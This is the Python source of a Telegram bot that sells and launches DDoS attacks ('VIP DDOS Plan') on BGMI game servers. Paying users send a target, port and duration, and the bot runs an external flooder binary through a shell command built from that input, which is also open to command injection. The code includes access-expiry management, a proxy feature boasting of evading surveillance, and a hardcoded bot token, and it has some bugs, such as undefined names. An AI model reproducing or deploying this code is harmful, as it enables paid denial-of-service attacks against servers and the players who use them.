#!/usr/bin/python3
# MADE BY @InsaneCheatsOwner
import telebot
import multiprocessing
import os
import random
from datetime import datetime, timedelta
import subprocess
import sys
import time 
import logging
import socket
import asyncio
import pytz  # Import pytz for timezone handling

bot = telebot.TeleBot('7599785141:AAHc6PvVkhdil2ZD69eNp9kXF-CBu9Wbt2w')
USERNAME = "@matrix_cheats"
# Admin user IDs
admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')
# File to store allowed user IDs and their expiration times
USER_FILE = "users.txt"
cooldown_timestamps = {}
# File to store command logs
LOG_FILE = "log.txt"

# Set Indian Standard Time (IST)
IST = pytz.timezone('Asia/Kolkata')

# Absolute path to the ak.bin file (modify this to point to the correct path)
AK_BIN_PATH = 'KALUAA'

# Function to read user IDs and their expiration times from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            lines = file.read().splitlines()
            users = {}
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, expiration_time = user_info
                        users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
            return users
    except FileNotFoundError:
        return {}

# Function to save users to file
def save_users(users):
    with open(USER_FILE, "w") as file:
        for user_id, expiration_time in users.items():
            file.write(f"{user_id} {expiration_time.isoformat()}\n")

# Function to remove expired users
def remove_expired_users():
    users = read_users()
    current_time = datetime.now(IST)
  # Ensure current time is in IST
    print(f"Current time: {current_time}")  # Debug log
    expired_users = []
    for user_id, exp_time in users.items():
        print(f"Checking user {user_id}, Expiration: {exp_time}")  # Debug log
        # Ensure expired user check works by comparing current time and expiration time
        if exp_time <= current_time:
            expired_users.append(user_id)
            print(f"User {user_id} has expired and will be removed.")  # Debug log

    for user_id in expired_users:
        del users[user_id]

    if expired_users:
        save_users(users)
        print(f"Removed expired users: {expired_users}")  # Debug log
    else:
        print("No expired users to remove.")  # Debug log

# Asyncio Loop for Operations
async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

# Proxy Update Command with Dark Authority
def update_proxy():
    proxy_list = []  # Define proxies here
    proxy = random.choice(proxy_list) if proxy_list else None
    if proxy:
        telebot.apihelper.proxy = {'https': proxy}
        logging.info("🕴️ Proxy shift complete. Surveillance evaded.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, f"🔄 Proxy locked in. We’re untouchable. Bot by {USERNAME}")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Proxy config failed: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

@bot.message_handler(commands=['add'])
def add_user(message):
    remove_expired_users()  # Check for expired users
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split()
        if len(command) == 3:
            user_to_add = command[1]
            minutes = int(command[2])
            expiration_time = datetime.now(IST) + timedelta(minutes=minutes)  # Set expiration in IST
            
            users = read_users()
            if user_to_add not in users:
                users[user_to_add] = expiration_time
                save_users(users)
                response = f"User {user_to_add} added successfully with expiration time of {minutes} minutes."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID and the expiration time in minutes."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            users = read_users()
            if user_to_remove in users:
                del users[user_to_remove]
                save_users(users)
                response = f"User {user_to_remove} removed successfully."
            else:
                response = "User not found."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    remove_expired_users()  # Check for expired users
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        users = read_users()
        response = "Authorized Users:\n"
        current_time = datetime.now(IST)
  # Get current time in IST
        active_users = [user_id for user_id, exp_time in users.items() if exp_time > current_time]
        
        if active_users:
            for user_id in active_users:
                response += f"- {user_id} (Expires at: {users[user_id]})\n"
        else:
            response = "No active users found."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)
        
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

#Store ongoing attacks globally
ongoing_attacks = []

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    # Track the ongoing attack
    ongoing_attacks.append({
        'user': username,
        'target': target,
        'port': port,
        'time': time,
        'start_time': datetime.now(IST)
    })

    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @InsaneCheatsOwner"
    bot.reply_to(message, response)

    full_command = f"./Moin {target} {port} {time} 60"
    try:
        print(f"Executing command: {full_command}")  # Log the command
        result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
        
        # Remove attack from ongoing list once finished
        ongoing_attacks.remove({
            'user': username,
            'target': target,
            'port': port,
            'time': time,
            'start_time': ongoing_attacks[-1]['start_time']
        })
        
        if result.returncode == 0:
            bot.reply_to(message, f"BGMI Attack Finished \nBY @InsaneCheatsOwner.\nOutput: {result.stdout}")
        else:
            bot.reply_to(message, f"Error in BGMI Attack.\nError: {result.stderr}")
    except Exception as e:
        bot.reply_to(message, f"Exception occurred while executing the command.\n{str(e)}")

        
@bot.message_handler(commands=['status'])
def show_status(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner or user_id in read_users():
        response = "Ongoing Attacks:\n\n"
        if ongoing_attacks:
            for attack in ongoing_attacks:
                response += (f"User: {attack['user']}\nTarget: {attack['target']}\nPort: {attack['port']}\n"
                             f"Time: {attack['time']} seconds\n"
                             f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        else:
            response += "No ongoing attacks currently."

        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to view the status.")
        
# Global dictionary to track cooldown times for users
bgmi_cooldown = {}

@bot.message_handler(commands=['insane'])
def handle_insane(message):
    remove_expired_users()  # Check for expired users
    user_id = str(message.chat.id)
    
    users = read_users()
    command = message.text.split()
    
    # Initialize response to a default value
    response = "You Are Not Authorized To Use This Command.\nMADE BY @InsaneCheatsOwner"

    # Check if the user has any ongoing attacks
    if ongoing_attacks:
        response = "An attack is currently in progress. Please wait until it completes before starting a new one."
    elif user_id in admin_owner or user_id in users:
        if user_id in admin_owner:
            # Admin owner can bypass cooldown
            if len(command) == 4:  # Ensure proper command format (no threads argument)
                try:
                    target = command[1]
                    port = int(command[2])  # Convert port to integer
                    time = int(command[3])  # Convert time to integer

                    if time > 180:
                        response = "Error: Time interval must be 180 seconds or less"
                    else:
                        # Start the attack without setting a cooldown for admin owners
                        start_attack_reply(message, target, port, time)
                        return  # Early return since response is handled in start_attack_reply
                except ValueError:
                    response = "Error: Please ensure port and time are integers."
            else:
                response = "Usage: /insane <target> <port> <time>"
        else:
            # Non-admin users, check if they are within the cooldown period
            if user_id in bgmi_cooldown:
                cooldown_expiration = bgmi_cooldown[user_id]
                current_time = datetime.now(pytz.timezone('Asia/Kolkata'))  # Get current time in IST
                if current_time < cooldown_expiration:
                    time_left = (cooldown_expiration - current_time).seconds
                    response = f"You need to wait {time_left} seconds before using the /insane command again."
                else:
                    # Cooldown has expired, proceed with the command
                    if len(command) == 4:  # Ensure proper command format (no threads argument)
                        try:
                            target = command[1]
                            port = int(command[2])  # Convert port to integer
                            time = int(command[3])  # Convert time to integer

                            if time > 180:
                                response = "Error: Time interval must be 180 seconds or less"
                            else:
                                # Start the attack and set the new cooldown
                                start_attack_reply(message, target, port, time)
                                bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
                                return  # Early return since response is handled in start_attack_reply
                        except ValueError:
                            response = "Error: Please ensure port and time are integers."
                    else:
                        response = "Usage: /insane <target> <port> <time>"
            else:
                # User not in cooldown, proceed with the command
                if len(command) == 4:  # Ensure proper command format (no threads argument)
                    try:
                        target = command[1]
                        port = int(command[2])  # Convert port to integer
                        time = int(command[3])  # Convert time to integer

                        if time > 180:
                            response = "Error: Time interval must be 180 seconds or less"
                        else:
                            # Start the attack and set the new cooldown
                            start_attack_reply(message, target, port, time)
                            bgmi_cooldown[user_id] = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(minutes=5)
                            return  # Early return since response is handled in start_attack_reply
                    except ValueError:
                        response = "Error: Please ensure port and time are integers."
                else:
                    response = "Usage: /insane <target> <port> <time>"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    try:
        user_id = str(message.chat.id)

        # Basic help text for all users
        help_text = '''Available Commands:
    - /insane : Execute a BGMI server attack (specific conditions apply).
    - /rulesanduse : View usage rules and important guidelines.
    - /plan : Check available plans and pricing for the bot.
    - /status : View ongoing attack details.
    - /id : Retrieve your user ID.
    '''

        # Check if the user is an admin and append admin commands
        if user_id in admin_id:
            help_text += '''
Admin Commands:
    - /add <user_id> <time_in_minutes> : Add a user with specified time.
    - /remove <user_id> : Remove a user from the authorized list.
    - /allusers : List all authorized users.
    - /broadcast : Send a broadcast message to all users.
    '''

        # Footer with channel and owner information
        help_text += ''' 
JOIN CHANNEL - @insan3cheats
BUY / OWNER - @InsaneCheatsOwner
'''

        # Send the constructed help text to the user
        bot.reply_to(message, help_text)
    
    except Exception as e:
        logging.error(f"Error in /help command: {e}")
        bot.reply_to(message, "An error occurred while fetching help. Please try again.")
    
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Our BOT, {user_name}\nRun This Command : /help\nJOIN CHANNEL - @insan3cheats\nBUY / OWNER - @InsaneCheatsOwner "
    bot.reply_to(message, response)

@bot.message_handler(commands=['rulesanduse'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Time Should Be 180 or Below
2. Click /status Before Entering Match
3. If There Are Any Ongoing Attacks You Cant use Wait For Finish
JOIN CHANNEL - @insan3cheats
BUY / OWNER - @InsaneCheatsOwner '''
   
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 
    Purchase VIP DDOS Plan From @InsaneCheatsOwner
    Join Channel @insan3cheats
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_id = str(message.chat.id)

    # Check if user is in owners.txt
    with open('owner.txt', "r") as file:
        owners = file.read().splitlines()

    if user_id in owners:
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:

        /add <userId> : Add a User.
        /remove <userId> : Remove a User.
        /allusers : Authorized Users List.
        /broadcast : Broadcast a Message.
        Channel - @insan3cheats
        Owner/Buy - @InsaneCheatsOwner
        '''
        bot.reply_to(message, response)
    else:
        response = "You do not have permission to access admin commands."
        bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open('users.txt', "r") as file:
                users = file.read().splitlines()
                if users:
                    for user in users:
                        try:
                            bot.send_message(user, message_to_broadcast)
                        except Exception as e:
                            print(f"Failed to send broadcast message to user {user}: {str(e)}")
                    response = "Broadcast Message Sent Successfully To All Users."
                else:
                    response = "No users found in users.txt."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

def run_bot():
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)  # Add timeout to prevent long idle periods
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")
            time.sleep(15)  # Sleep before restarting the bot

if __name__ == "__main__":
    run_bot()
